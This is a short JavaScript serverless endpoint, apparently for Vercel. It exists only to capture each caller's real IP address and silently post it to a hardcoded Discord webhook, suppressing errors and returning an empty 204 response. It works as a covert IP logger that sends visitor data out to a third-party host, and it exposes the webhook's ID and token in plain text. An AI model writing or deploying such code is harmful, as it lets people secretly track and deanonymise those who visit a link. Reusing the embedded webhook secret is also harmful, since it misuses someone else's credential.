export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).end();
  }

  // Get real client IP (Vercel-aware)
  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket.remoteAddress ||
    "unknown";

  const WEBHOOK_URL = "https://discord.com/api/webhooks/1455672899192225989/9kdKQBwgdrCBlnxg4TLe57jftACcS7vaEM6AELseBrIPgmxTwVtZxiu5Qu_eeS-ex1Z1";

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `User IP: ${ip}`
      })
    });
  } catch (e) {
    // fail silently
  }

  res.status(204).end();
}
